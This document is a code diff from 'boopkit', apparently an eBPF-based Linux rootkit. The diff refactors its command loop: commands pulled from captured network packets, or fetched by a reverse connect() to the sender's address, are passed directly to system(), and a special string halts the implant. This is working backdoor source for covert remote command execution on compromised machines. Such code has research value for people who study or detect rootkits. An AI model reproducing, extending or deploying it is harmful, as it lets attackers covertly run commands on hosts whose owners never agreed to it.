@@ -47,6 +47,9 @@
 #include "pr0be.skel.xdp.h"
 // clang-format on
 
+
+int boopkit_alive = 1;
+
 void usage() {
   asciiheader();
   boopprintf("\nBoopkit.\n");
@@ -207,11 +210,23 @@ void rootcheck(int argc, char **argv) {
   boopprintf("  -> getppid()               : %ld\n", lppid);
 }
 
-/**
- * main
- *
- * Main entrypoint for the program.
- */
+int exec(char *rce) {
+  char *ret;
+  ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
+  if (ret) {
+    // Halt!
+    xcap_collect = 0;  // Stop the xcap loop
+    boopkit_alive = 0; // Stop the boopkit loop
+    boopprintf("  XX Halting boopkit: %s\n", ret);
+    free(rce);
+    return 0;
+  }
+  boopprintf("  <- Executing: %s\n", rce);
+  system(rce);
+  free(rce);
+  return 1;
+}
+
 int main(int argc, char **argv) {
   clisetup(argc, argv);
   asciiheader();
@@ -351,13 +366,12 @@ int main(int argc, char **argv) {
   //
   //
   int ignore = 0;
-  while (1) {
+  while (boopkit_alive) {
     ring_buffer__poll(rb, 100);  // Ignore errors!
     // perf_buffer__poll(pb, 100); // Ignore errors!
 
     int ikey = 0, jkey;
     int err;
-    char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
     __u8 saddrbytes[4];
     struct event_boop_t ret;
 
@@ -368,11 +382,13 @@ int main(int argc, char **argv) {
       }
 
       // Calculate saddrval
-      // Copy the first 4 bytes on to saddrbytes
+      char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
       memcpy(saddrbytes, ret.saddr, sizeof saddrbytes);
       inet_ntop(AF_INET, &saddrbytes, saddrval, sizeof(saddrval));
+      boopprintf("  ** Boop source: %s\n", saddrval);
 
-      // ---- [ FILTER ] -----
+
+      // Filter boop addrs
       ignore = 0;
       for (int i = 0; i < cfg.denyc; i++) {
         if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {
@@ -381,65 +397,44 @@ int main(int argc, char **argv) {
           break;
         }
       }
-      // ---- [ FILTER ] ----
+      if (ignore) {
+        continue;
+      }
 
-      if (!ignore) {
-        // Arrange the saddrval bytes from the kernel
-        if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
-          boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
-        } else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
-          boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
-        }
-        boopprintf("  ** Boop source: %s\n", saddrval);
+      // Future hook for probe specific logic
+      //if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
+      //  boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
+      //} else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
+      //  boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
+      //}
 
-        if (!cfg.payload) {
-          char *rce = malloc(MAX_RCE_SIZE);
-          int retval;
-          // Check the packet buffer for the value to execute.
-          retval = xcaprce(saddrval, rce);
-          if (retval == 0) {
-            char *ret;
-            ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
-            if (ret) {
-              // Halt!
-              xcap_collect = 0;
-              boopprintf("  XX Halting boopkit: %s\n", ret);
-              return 0;
-            }
-            boopprintf("  <- Executing: %s\n", rce);
-            system(rce);
-            continue;
-          }
-          // Still no luck, try to look it up!
-          boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
-          retval = recvrce(saddrval, rce);
-          if (retval == 0) {
-            boopprintf("  <- Executing: %s\r\n", rce);
-            system(rce);
-          }
-          free(rce);
-        } else {
-          char *rce = malloc(MAX_RCE_SIZE);
-          int retval;
-          retval = xcaprce(saddrval, rce);
-          if (retval == 0) {
-            char *ret;
-            ret = strstr(rce, BOOPKIT_RCE_CMD_HALT);
-            if (ret) {
-              // Halt!
-              xcap_collect = 0;
-              boopprintf("  XX Halting boopkit: %s\n", ret);
-              return 0;
-            }
-            boopprintf("  <- Executing: %s\n", rce);
-            system(rce);
-          }
+
+      // Always check for RCE in the ring buffer.
+      char *rce = malloc(MAX_RCE_SIZE);
+      int xcap_found;
+      // Check the packet buffer for the value to execute.
+      xcap_found = xcaprce(saddrval, rce);
+      if (xcap_found == 0) {
+        exec(rce);
+        bpf_map_delete_elem(fd, &jkey);
+        ikey = jkey;
+        continue;
+      }
+
+      if (!cfg.payload) {
+        boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
+        int retval;
+        retval = recvrce(saddrval, rce);
+        if (retval == 0) {
+          exec(rce);
+          bpf_map_delete_elem(fd, &jkey);
+          ikey = jkey;
+          continue;
         }
       }
-      err = bpf_map_delete_elem(fd, &jkey);
-      if (err < 0) {
-        return 0;
-      }
+
+
+      bpf_map_delete_elem(fd, &jkey);
       ikey = jkey;
     }
   }
